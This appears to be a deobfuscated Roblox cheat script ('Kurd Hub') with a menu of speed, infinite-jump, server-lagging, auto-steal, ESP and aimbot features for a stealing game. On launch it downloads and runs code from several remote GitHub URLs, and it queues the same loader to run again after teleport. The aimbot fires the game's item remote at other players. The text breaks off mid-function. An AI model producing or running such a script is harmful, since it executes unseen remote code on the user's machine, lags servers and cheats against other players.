_HEfjAPfFrpfV = "This file was protected with MoonSec V3"

local fenv = getfenv(1)

pcall(function()
end)

pcall(function()
end)

pcall(function()
end)

local fenv = getfenv(1)

pcall(function()
    -- Main script execution
    if _G.jrtofrt then 
        game.StarterGui:SetCore("SendNotification", {
            Title = "Tiktok: jack 827",
            Text = "You already executed Kurd Hub",
            Duration = 5
        })
        return 
    end
    
    -- Services
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StarterGui = game:GetService("StarterGui")
    local HttpService = game:GetService("HttpService")
    
    -- Queue on teleport
    pcall(function()
        queue_on_teleport([[
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub", true))()
        ]])
    end)
    
    -- Load external scripts
    local externalScripts = {
        "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/help",
        "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Data",
        "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Best",
        "https://raw.githubusercontent.com/Ninja10908/S4/refs/head/main/J"
    }
    
    for _, url in ipairs(externalScripts) do
        task.spawn(function()
            local success, err = pcall(function()
                local code = game:HttpGet(url)
                loadstring(code)()
            end)
            if not success then 
                warn("")
            end
        end)
    end
    
    -- Variables
    local LocalPlayer = Players.LocalPlayer
    local uiScale = 0.68
    
    -- UI Creation Function
    local function createKurdHubUI()
        local buttonLabels = {
            "Speed 🏎️",
            "120FPS | No Lag",
            "Infinite Jump🦵",
            "Lag Server 💀",
            "Auto Steal Nearset brain 🎒",
            "Player esp 👀",
            "Base Esp 🔎",
            "AimBot 🏳️",
            "Pet Finder 👑",
            "Play Game 🎮",
            "Platform 🏷️",
            "Auto Kick ⏳"
        }
        
        local buttonCount = #buttonLabels
        local buttonHeight = math.floor(50 * uiScale)
        local padding = math.floor(10 * uiScale)
        local headerHeight = math.floor(50 * uiScale)
        local bottomPadding = math.floor(20 * uiScale)
        local cornerRadius = math.floor(18 * uiScale)
        local smallPadding = math.floor(10 * uiScale)
        local shadowOffset = math.floor(6 * uiScale)
        local columns = 2
        local rows = math.ceil(buttonCount / columns)
        local buttonWidth = math.floor(150 * uiScale)
        local totalWidth = buttonWidth * columns + padding * (columns + 1)
        local totalHeight = headerHeight + rows * buttonHeight + (rows - 1) * padding + cornerRadius + bottomPadding + smallPadding + shadowOffset
        local shadowWidth = totalWidth + math.floor(6 * uiScale)
        local shadowHeight = totalHeight + math.floor(6 * uiScale)
        
        -- Create ScreenGui
        local screenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
        screenGui.DisplayOrder = 999999
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        screenGui.Name = "kurdhubMenu"
        screenGui.ResetOnSpawn = false
        screenGui.Enabled = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        -- Shadow Frame
        local shadowFrame = Instance.new("Frame", screenGui)
        shadowFrame.Size = UDim2.new(0, shadowWidth, 0, shadowHeight)
        shadowFrame.Position = UDim2.new(0.5, -shadowWidth // 2, 0.5, -shadowHeight // 2)
        shadowFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        shadowFrame.BorderSizePixel = 0
        shadowFrame.ZIndex = 0
        shadowFrame.Visible = false
        
        local shadowCorner = Instance.new("UICorner", shadowFrame)
        shadowCorner.CornerRadius = UDim.new(0, math.floor(18 * uiScale))
        
        -- Main Frame
        local mainFrame = Instance.new("Frame", screenGui)
        mainFrame.Size = UDim2.new(0, totalWidth, 0, totalHeight)
        mainFrame.Position = UDim2.new(0.5, -totalWidth // 2, 0.5, -totalHeight // 2)
        mainFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
        mainFrame.BorderSizePixel = 0
        mainFrame.Active = true
        mainFrame.ZIndex = 1
        mainFrame.Visible = true
        
        local mainCorner = Instance.new("UICorner", mainFrame)
        mainCorner.CornerRadius = UDim.new(0, math.floor(16 * uiScale))
        
        -- Header Frame
        local headerFrame = Instance.new("Frame", mainFrame)
        headerFrame.Size = UDim2.new(1, 0, 0, headerHeight)
        headerFrame.Position = UDim2.new(0, 0, 0, 0)
        headerFrame.BackgroundTransparency = 1
        headerFrame.ZIndex = 2
        
        -- Logo
        local logo = Instance.new("ImageLabel", headerFrame)
        logo.Size = UDim2.new(0, math.floor(48 * uiScale), 0, math.floor(48 * uiScale))
        logo.Position = UDim2.new(0, math.floor(8 * uiScale), 0, math.floor(3 * uiScale))
        logo.BackgroundTransparency = 1
        logo.Image = ""
        logo.ZIndex = 2
        
        local logoCorner = Instance.new("UICorner", logo)
        logoCorner.CornerRadius = UDim.new(1, 0)
        
        -- Title
        local title = Instance.new("TextLabel", headerFrame)
        title.Size = UDim2.new(1, math.floor(-70 * uiScale), 1, 0)
        title.Position = UDim2.new(0, math.floor(64 * uiScale), 0, 0)
        title.BackgroundTransparency = 1
        title.Text = "Kurd hub"
        title.Font = Enum.Font.GothamBold
        title.TextSize = 36 * uiScale
        title.TextColor3 = Color3.fromRGB(22, 22, 22)
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.ZIndex = 2
        
        -- Toggle Button
        local toggleButton = Instance.new("TextButton", screenGui)
        toggleButton.Size = UDim2.new(0, 40, 0, 40)
        toggleButton.Position = UDim2.new(0, 500, 0.5, -20)
        toggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        toggleButton.Text = "kurdhub"
        toggleButton.Font = Enum.Font.GothamBold
        toggleButton.TextSize = 10
        toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        toggleButton.BorderSizePixel = 0
        toggleButton.ZIndex = 4
        
        local toggleCorner = Instance.new("UICorner", toggleButton)
        toggleCorner.CornerRadius = UDim.new(0, 8)
        
        -- Toggle Button Dragging
        local dragging, dragInput, dragStart, startPos
        
        toggleButton.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = toggleButton.Position
                
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
        
        toggleButton.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)
        
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - dragStart
                toggleButton.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end)
        
        toggleButton.MouseButton1Click:Connect(function()
            mainFrame.Visible = not mainFrame.Visible
            shadowFrame.Visible = mainFrame.Visible
        end)
        
        -- Main Frame Dragging
        local frameDragging, frameDragInput, frameDragStart, frameStartPos
        
        headerFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                frameDragging = true
                frameDragStart = input.Position
                frameStartPos = mainFrame.Position
                
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        frameDragging = false
                    end
                end)
            end
        end)
        
        headerFrame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                frameDragInput = input
            end
        end)
        
        UserInputService.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch and frameDragging then
                local delta = input.Position - frameDragStart
                mainFrame.Position = UDim2.new(
                    frameStartPos.X.Scale,
                    frameStartPos.X.Offset + delta.X,
                    frameStartPos.Y.Scale,
                    frameStartPos.Y.Offset + delta.Y
                )
                shadowFrame.Position = UDim2.new(
                    mainFrame.Position.X.Scale,
                    mainFrame.Position.X.Offset - 4,
                    mainFrame.Position.Y.Scale,
                    mainFrame.Position.Y.Offset - 4
                )
            end
        end)
        
        mainFrame:GetPropertyChangedSignal("Position"):Connect(function()
            shadowFrame.Position = UDim2.new(
                mainFrame.Position.X.Scale,
                mainFrame.Position.X.Offset - 4,
                mainFrame.Position.Y.Scale,
                mainFrame.Position.Y.Offset - 4
            )
        end)
        
        -- Create Buttons
        local buttons = {}
        
        for index, label in ipairs(buttonLabels) do
            local row = math.ceil(index / columns) - 1
            local col = (index - 1) % columns
            local xPos = padding + col * (buttonWidth + padding)
            local yPos = headerHeight + padding + row * (buttonHeight + padding)
            
            local buttonContainer = Instance.new("Frame", mainFrame)
            buttonContainer.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
            buttonContainer.Position = UDim2.new(0, xPos, 0, yPos)
            buttonContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            buttonContainer.BorderSizePixel = 0
            buttonContainer.ZIndex = 2
            
            local containerCorner = Instance.new("UICorner", buttonContainer)
            containerCorner.CornerRadius = UDim.new(0, math.floor(16 * uiScale))
            
            local button = Instance.new("TextButton", buttonContainer)
            button.Size = UDim2.new(1, -math.floor(4 * uiScale), 1, -math.floor(4 * uiScale))
            button.Position = UDim2.new(0, math.floor(2 * uiScale), 0, math.floor(2 * uiScale))
            button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            button.Text = label
            button.Font = Enum.Font.GothamBlack
            button.TextSize = 20 * uiScale
            button.TextColor3 = Color3.fromRGB(26, 26, 26)
            button.BorderSizePixel = 0
            button.AutoButtonColor = true
            button.ZIndex = 3
            button.TextWrapped = true
            
            local buttonCorner = Instance.new("UICorner", button)
            buttonCorner.CornerRadius = UDim.new(0, math.floor(12 * uiScale))
            
            button.MouseEnter:Connect(function()
                button.BackgroundColor3 = button.BackgroundColor3 == Color3.fromRGB(0, 255, 0) 
                    and Color3.fromRGB(0, 255, 0) 
                    or Color3.fromRGB(240, 240, 240)
            end)
            
            button.MouseLeave:Connect(function()
                button.BackgroundColor3 = button.BackgroundColor3 == Color3.fromRGB(0, 255, 0) 
                    and Color3.fromRGB(0, 255, 0) 
                    or Color3.new(1, 1, 1)
            end)
            
            buttonContainer.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                    button:SetAttribute("Pressed", true)
                    button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
                end
            end)
            
            buttonContainer.InputEnded:Connect(function(input)
                if button:GetAttribute("Pressed") and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) then
                    button:SetAttribute("Pressed", false)
                    if button.BackgroundColor3 ~= Color3.fromRGB(0, 255, 0) then
                        button.BackgroundColor3 = Color3.new(1, 1, 1)
                    end
                    button:Fire("MouseButton1Click")
                end
            end)
            
            buttons[index] = button
        end
        
        return buttons
    end
    
    -- Create UI
    local Buttons = createKurdHubUI()
    
    -- ===========================
    -- FEATURE 1: SPEED HACK
    -- ===========================
    local speedEnabled = true
    local jumpEnabled = true
    local speedConnection
    local jumpConnection
    local walkSpeed = 25.5
    local jumpPower = 69
    
    local function setupSpeedHack(character)
        local humanoid = character:WaitForChild("Humanoid")
        
        if speedConnection then
            speedConnection:Disconnect()
            speedConnection = nil
        end
        
        speedConnection = RunService.RenderStepped:Connect(function()
            if speedEnabled and humanoid and humanoid.RootPart then
                local moveDirection = humanoid.MoveDirection
                if moveDirection.Magnitude > 0 then
                    humanoid.RootPart.Velocity = Vector3.new(
                        moveDirection.X * walkSpeed,
                        humanoid.RootPart.Velocity.Y,
                        moveDirection.Z * walkSpeed
                    )
                end
            end
        end)
    end
    
    local function enableSpeed()
        speedEnabled = true
        if LocalPlayer.Character then
            setupSpeedHack(LocalPlayer.Character)
        end
    end
    
    local function disableSpeed()
        speedEnabled = false
        if speedConnection then
            speedConnection:Disconnect()
            speedConnection = nil
        end
    end
    
    local function setupInfiniteJump(character)
        local humanoid = character:WaitForChild("Humanoid")
        
        if jumpConnection then
            jumpConnection:Disconnect()
            jumpConnection = nil
        end
        
        jumpConnection = RunService.Heartbeat:Connect(function()
            if jumpEnabled and humanoid and humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                local rootPart = humanoid.RootPart
                if rootPart then
                    rootPart.Velocity = Vector3.new(
                        rootPart.Velocity.X,
                        math.min(rootPart.Velocity.Y + jumpPower / 2, jumpPower),
                        rootPart.Velocity.Z
                    )
                end
            end
        end)
    end
    
    local function enableInfiniteJump()
        jumpEnabled = true
        if LocalPlayer.Character then
            setupInfiniteJump(LocalPlayer.Character)
        end
    end
    
    local function disableInfiniteJump()
        jumpEnabled = false
        if jumpConnection then
            jumpConnection:Disconnect()
            jumpConnection = nil
        end
    end
    
    LocalPlayer.CharacterAdded:Connect(function(character)
        if speedEnabled then
            character:WaitForChild("Humanoid")
            setupSpeedHack(character)
        end
        if jumpEnabled then
            setupInfiniteJump(character)
        end
    end)
    
    Buttons[1].MouseButton1Click:Connect(function()
        speedEnabled = not speedEnabled
        jumpEnabled = not jumpEnabled
        
        if speedEnabled and jumpEnabled then
            Buttons[1].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            enableSpeed()
            enableInfiniteJump()
        else
            Buttons[1].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            disableSpeed()
            disableInfiniteJump()
        end
    end)
    
    Buttons[1].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    enableSpeed()
    enableInfiniteJump()
    
    -- ===========================
    -- FEATURE 12: AUTO KICK
    -- ===========================
    local autoKickEnabled = false
    local autoKickConnection = nil
    
    local function checkForSteal()
        if not autoKickEnabled then return end
        
        for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                if gui.Text:find("You stole") then
                    LocalPlayer:Kick("You kicked by jack")
                    return
                end
            end
        end
    end
    
    Buttons[12].MouseButton1Click:Connect(function()
        autoKickEnabled = not autoKickEnabled
        
        if autoKickEnabled then
            Buttons[12].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            if autoKickConnection then
                autoKickConnection:Disconnect()
            end
            autoKickConnection = RunService.RenderStepped:Connect(checkForSteal)
        else
            Buttons[12].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            if autoKickConnection then
                autoKickConnection:Disconnect()
                autoKickConnection = nil
            end
        end
    end)
    
    Buttons[12].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- ===========================
    -- FEATURE 3: INFINITE JUMP (UserInput Version)
    -- ===========================
    local infiniteJumpEnabled = true
    local jumpRequestConnection
    
    local function doJump()
        local character = LocalPlayer.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        
        if humanoid and humanoid.Health > 0 and rootPart then
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, 50, rootPart.Velocity.Z)
        end
    end
    
    local function setupJumpRequest()
        if jumpRequestConnection then
            jumpRequestConnection:Disconnect()
            jumpRequestConnection = nil
        end
        
        jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
            if infiniteJumpEnabled then
                doJump()
            end
        end)
    end
    
    local function initializeJumpForCharacter(character)
        local humanoid = character:WaitForChild("Humanoid")
        setupJumpRequest()
        
        character.ChildAdded:Connect(function(child)
            if child:IsA("Humanoid") then
                setupJumpRequest()
            end
        end)
    end
    
    LocalPlayer.CharacterAdded:Connect(function(character)
        initializeJumpForCharacter(character)
    end)
    
    if LocalPlayer.Character then
        initializeJumpForCharacter(LocalPlayer.Character)
    end
    
    if Buttons and Buttons[3] then
        Buttons[3].MouseButton1Click:Connect(function()
            infiniteJumpEnabled = not infiniteJumpEnabled
            
            if infiniteJumpEnabled then
                Buttons[3].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            else
                Buttons[3].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            end
        end)
        
        Buttons[3].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    end
    
    setupJumpRequest()
    
    -- ===========================
    -- FEATURE 4: LAG SERVER
    -- ===========================
    local lagServerEnabled = false
    local lagServerCoroutine
    
    local function findTool(toolName)
        return LocalPlayer.Backpack:FindFirstChild(toolName) or LocalPlayer.Character:FindFirstChild(toolName)
    end
    
    local function equipTool(tool)
        if tool and tool.Parent ~= LocalPlayer.Character then
            tool.Parent = LocalPlayer.Character
            return true
        end
        return false
    end
    
    local function unequipTool(tool)
        if tool and tool.Parent == LocalPlayer.Character then
            tool.Parent = LocalPlayer.Backpack
            return true
        end
        return false
    end
    
    local function setLagServer(enabled)
        lagServerEnabled = enabled
        
        if Buttons and Buttons[4] then
            Buttons[4].BackgroundColor3 = lagServerEnabled 
                and Color3.fromRGB(0, 255, 0) 
                or Color3.fromRGB(120, 255, 255)
        end
        
        if lagServerEnabled then
            local bat = findTool("Bat")
            if bat then
                equipTool(bat)
            end
            
            local medusaHead = findTool("Medusa's Head")
            if not medusaHead then return end
            
            lagServerCoroutine = coroutine.create(function()
                while lagServerEnabled and medusaHead do
                    equipTool(medusaHead)
                    wait(0.05)
                    unequipTool(medusaHead)
                    wait(0.25)
                end
            end)
            
            coroutine.resume(lagServerCoroutine)
        else
            lagServerEnabled = false
        end
    end
    
    if Buttons and Buttons[4] then
        Buttons[4].MouseButton1Click:Connect(function()
            setLagServer(not lagServerEnabled)
        end)
    end
    
    LocalPlayer.CharacterAdded:Connect(function(character)
        wait(1)
        if lagServerEnabled then
            setLagServer(lagServerEnabled)
        end
    end)
    
    -- ===========================
    -- FEATURE 5: AUTO STEAL
    -- ===========================
    if not ControlTable then
        ControlTable = {}
    end
    ControlTable.AutoSteal = false
    
    local promptConnections = {}
    
    local function disconnectAllPrompts()
        for _, connection in ipairs(promptConnections) do
            connection:Disconnect()
        end
        promptConnections = {}
    end
    
    local function onPromptShown(prompt)
        if ControlTable.AutoSteal and prompt and string.find(prompt.ActionText:lower(), "steal") then
            prompt:InputHoldBegin()
        end
    end
    
    local function enableAutoSteal()
        disconnectAllPrompts()
        table.insert(promptConnections, ProximityPromptService.PromptShown:Connect(onPromptShown))
        
        for _, prompt in ipairs(Workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") and string.find(prompt.ActionText:lower(), "steal") then
                onPromptShown(prompt)
            end
        end
    end
    
    local function disableAutoSteal()
        disconnectAllPrompts()
    end
    
    Buttons[5].MouseButton1Click:Connect(function()
        ControlTable.AutoSteal = not ControlTable.AutoSteal
        
        if ControlTable.AutoSteal then
            Buttons[5].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            enableAutoSteal()
        else
            Buttons[5].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            disableAutoSteal()
        end
    end)
    
    Buttons[5].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- ===========================
    -- FEATURE 6: PLAYER ESP
    -- ===========================
    local espFolder = Instance.new("Folder")
    espFolder.Name = "PlayerESP"
    espFolder.Parent = game.CoreGui
    
    local playerESPEnabled = true
    local espConnections = {}
    
    local function createESP(player)
        if player == LocalPlayer then return end
        
        local character = player.Character
        if not character then return end
        
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end
        
        local existingESP = espFolder:FindFirstChild(player.Name)
        if existingESP then
            existingESP:Destroy()
        end
        
        local box = Instance.new("BoxHandleAdornment")
        box.Name = player.Name
        box.Adornee = rootPart
        box.Size = rootPart.Size + Vector3.new(1.5, 2.5, 1.5)
        box.Color3 = Color3.fromRGB(0, 255, 0)
        box.AlwaysOnTop = true
        box.ZIndex = 10
        box.Transparency = 0.2
        box.Parent = espFolder
    end
    
    local function removeESP(player)
        local esp = espFolder:FindFirstChild(player.Name)
        if esp then
            esp:Destroy()
        end
    end
    
    local function enablePlayerESP()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                if player.Character then
                    createESP(player)
                end
                
                espConnections[player] = player.CharacterAdded:Connect(function()
                    task.wait(1)
                    createESP(player)
                end)
            end
        end
        
        espConnections.playerAdded = Players.PlayerAdded:Connect(function(player)
            espConnections[player] = player.CharacterAdded:Connect(function()
                task.wait(1)
                createESP(player)
            end)
        end)
        
        espConnections.playerRemoving = Players.PlayerRemoving:Connect(function(player)
            removeESP(player)
            if espConnections[player] then
                espConnections[player]:Disconnect()
                espConnections[player] = nil
            end
        end)
    end
    
    local function disablePlayerESP()
        for _, esp in pairs(espFolder:GetChildren()) do
            esp:Destroy()
        end
        
        for key, connection in pairs(espConnections) do
            if typeof(connection) == "RBXScriptConnection" then
                connection:Disconnect()
            end
            espConnections[key] = nil
        end
    end
    
    Buttons[6].MouseButton1Click:Connect(function()
        playerESPEnabled = not playerESPEnabled
        
        if playerESPEnabled then
            Buttons[6].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            enablePlayerESP()
        else
            Buttons[6].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            disablePlayerESP()
        end
    end)
    
    Buttons[6].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    enablePlayerESP()
    
    -- ===========================
    -- FEATURE 7: BASE ESP
    -- ===========================
    Buttons[7].MouseButton1Click:Connect(function()
        if not _G.SAB then
            _G.SAB = {}
        end
        
        if not _G.SAB.BigPlotTimers then
            _G.SAB.BigPlotTimers = {
                enabled = false,
                isRunning = false
            }
        end
        
        local plotTimers = _G.SAB.BigPlotTimers
        
        function plotTimers:Toggle(enable)
            if enable and not self.isRunning then
                self.enabled = true
            elseif not enable and self.enabled then
                self.enabled = false
            end
            
            self.isRunning = true
            
            task.spawn(function()
                while task.wait() and self.enabled do
                    pcall(function()
                        for _, plot in Workspace.Plots:GetChildren() do
                            if plot:FindFirstChild("Purchases") and plot.Purchases:FindFirstChild("PlotBlock") then
                                local plotBlock = plot.Purchases.PlotBlock
                                if plotBlock:FindFirstChild("Main") then
                                    local main = plotBlock.Main
                                    if main:FindFirstChild("BillboardGui") then
                                        local billboard = main.BillboardGui
                                        billboard.AlwaysOnTop = true
                                        billboard.MaxDistance = 1000
                                        billboard.Size = UDim2.fromScale(35, 50)
                                    end
                                end
                            end
                        end
                    end)
                end
                
                pcall(function()
                    for _, plot in Workspace.Plots:GetChildren() do
                        if plot:FindFirstChild("Purchases") and plot.Purchases:FindFirstChild("PlotBlock") then
                            local plotBlock = plot.Purchases.PlotBlock
                            if plotBlock:FindFirstChild("Main") then
                                local main = plotBlock.Main
                                if main:FindFirstChild("BillboardGui") then
                                    local billboard = main.BillboardGui
                                    billboard.AlwaysOnTop = false
                                    billboard.MaxDistance = 60
                                    billboard.Size = UDim2.fromScale(7, 10)
                                end
                            end
                        end
                    end
                end)
                
                self.isRunning = false
            end)
        end
        
        local newState = not plotTimers.enabled
        plotTimers:Toggle(newState)
        
        if newState then
            Buttons[7].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        else
            Buttons[7].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
    
    Buttons[7].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- ===========================
    -- FEATURE 8: AIMBOT
    -- ===========================
    task.defer(function()
        repeat task.wait() until Buttons and Buttons[8]
        
        local aimbotEnabled = true
        local aimbotConnection = nil
        local characterConnections = {}
        
        local packagesNet = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
        local useItemRemote = packagesNet:WaitForChild("RE/UseItem")
        
        local laserCapeVector = Vector3.new(-460.03, -6.11, -2.13)
        local webSlingerVector = Vector3.new(-353.26, -7.18, 114.64)
        
        local maxRange = 100
        local cooldown = 0.25
        
        local function getPlayersInRange()
            local player = Players.LocalPlayer
            local character = player.Character
            
            if not (character and character:FindFirstChild("HumanoidRootPart")) then
                return {}
            end
            
            local rootPart = character.HumanoidRootPart
            local playersInRange = {}
            
            for _, otherPlayer in ipairs(Players:GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (rootPart.Position - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance <= maxRange then
                        table.insert(playersInRange, otherPlayer)
                    end
                end
            end
            
            return playersInRange
        end
        
        local function getNearestPlayer()
            local player = Players.LocalPlayer
            local character = player.Character
            
            if not (character and character:FindFirstChild("HumanoidRootPart")) then
                return
            end
            
            local rootPart = character.HumanoidRootPart
            local nearest, nearestDistance = nil, math.huge
            
            for _, otherPlayer in ipairs(Players:GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (rootPart.Position - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance < nearestDistance then
                        nearestDistance = distance
                        nearest = otherPlayer
                    end
                end
            end
            
            return nearest
        end
        
        local function useLaserCape()
            if not aimbotEnabled then return end
            
            local playersInRange = getPlayersInRange()
            if #playersInRange == 0 then return end
            
            local targetPlayer = playersInRange[math.random(1, #playersInRange)]
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("UpperTorso") then
                pcall(function()
                    useItemRemote:FireServer(laserCapeVector, targetPlayer.Character.UpperTorso)
                end)
            end
        end
        
        local function useWebSlinger()
            if not aimbotEnabled then return end
            
            local targetPlayer = getNearestPlayer()
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    useItemRemote:FireServer(webSlingerVector, targetPlayer.Character.HumanoidRootPart)
                end)
            end
        end
        
        local function setupCharacterAimbot(character)
            if characterConnections[character] then
                for _, connection in ipairs(characterConnections[character]) do
                    connection:Disconnect()
                end
            end
            
            characterConnections[character] = {}
            
            local hasLaserCape, hasWebSlinger = false, false
            
            local function startAimbotLoop()
                if aimbotConnection then
                    aimbotConnection:Disconnect()
                end
                
                aimbotConnection = RunService.Heartbeat:Connect(function()
                    if not aimbotEnabled then return end
                    
                    if hasLaserCape then
                        useLaserCape()
                        task.wait(cooldown)
                    elseif hasWebSlinger then
                        useWebSlinger()
                        task.wait(cooldown)
                    end
                end)
            end
            
            local function onChildAdded(child)
                if child:IsA("Tool") then
                    if child.Name == "Laser Cape" then
                        hasLaserCape = true
                        if aimbotEnabled then
                            startAimbotLoop()
                        end
                    elseif child.Name == "Web Slinger" then
                        hasWebSlinger = true
                        if aimbotEnabled then
                            startAimbotLoop()
                        end
                    end
                end
            end
            
            local function onChildRemoved(child)
                if child:IsA("Tool") then
                    if child.Name == "Laser Cape" then
                        hasLaserCape = false
                    end
                    if child.Name == "Web Slinger" then
                        hasWebSlinger = false
                    end
                end
            end
            
            table.insert(characterConnections[character], character.ChildAdded:Connect(onChildAdded))
            table.insert(characterConnections[character], character.ChildRemoved:Connect(onChildRemoved))
            
            for _, child in ipairs(character:GetChildren()) do
                onChildAdded(child)
            end
            
            if (hasLaserCape or hasWebSlinger) and aimbotEnabled then
                startAimbotLoop()
            end
        end
        
        local function enableAimbot()
            aimbotEnabled = true
            local player = Players.LocalPlayer
            if player.Character then
                setupCharacterAimbot(player.Character)
            end
        end
        
        local function disableAimbot()
            aimbotEnabled = false
            if aimbotConnection then
                aimbotConnection:Disconnect()
                aimbotConnection = nil
            end
        end
        
        Buttons[8].MouseButton1Click:Connect(function()
            aimbotEnabled = not aimbotEnabled
            
            if aimbotEnabled then
                Buttons[8].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                enableAimbot()
            else
                Buttons[8].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                disableAimbot()
            end
        end)
        
        Buttons[8].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        enableAimbot()
        
        local player = Players.LocalPlayer
        player.CharacterAdded:Connect(function(character)
            if aimbotEnabled then
                setupCharacterAimbot(character)
            end
        end)
        
        if player.Character and aimbotEnabled then
            setupCharacterAimbot(player.Character)
        end
    end)
    
    -- ===========================
    -- FEATURE 9: PET FINDER
    -- ===========================
    Buttons[9].MouseButton1Click:Connect(function()
        local apiUrl = "https://games.roblox.com/v1/games/"
        local placeId, jobId = game.PlaceId, tostring(game.JobId)
        local isSearching = false
        local visitedServers = {}
        
        local hasIsFile = type(isfile) == "function"
        local hasWriteFile = type(writefile) == "function"
        local hasReadFile = type(readfile) == "function"
        local hasMakeFolder = type(makefolder) == "function"
        
        local folderName = "Joined_jack827"
        local fileName = string.format("%s/joined_%d.json", folderName, placeId)
        
        if hasMakeFolder then
            pcall(function()
                makefolder(folderName)
            end)
        end
        
        local function fileExists(path)
            if hasIsFile then
                local success, result = pcall(isfile, path)
                return success and result
            end
            return false
        end
        
        local function notify(title, text, duration)
            pcall(function()
                StarterGui:SetCore("SendNotification", {
                    Title = title or "Notification",
                    Text = text or "",
                    Duration = duration or 5
                })
            end)
        end
        
        local function saveVisitedServers()
            if not hasWriteFile then return end
            
            local success, err = pcall(function()
                local json = HttpService:JSONEncode(visitedServers)
                writefile(fileName, json)
            end)
        end
        
        local function loadVisitedServers()
            if hasReadFile and fileExists(fileName) then
                local success, content = pcall(readfile, fileName)
                if success and content then
                    local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, content)
                    if decodeSuccess and type(data) == "table" then
                        visitedServers = data
                    end
                end
            else
                visitedServers = {}
            end
            
            if not table.find(visitedServers, jobId) then
                table.insert(visitedServers, jobId)
                saveVisitedServers()
            end
        end
        
        local function markServerVisited(serverId)
            if not table.find(visitedServers, serverId) then
                table.insert(visitedServers, serverId)
                saveVisitedServers()
            end
        end
        
        local function hasVisited(serverId)
            return table.find(visitedServers, serverId) ~= nil
        end
        
        local function getServers(sortOrder)
            local success, response = pcall(function()
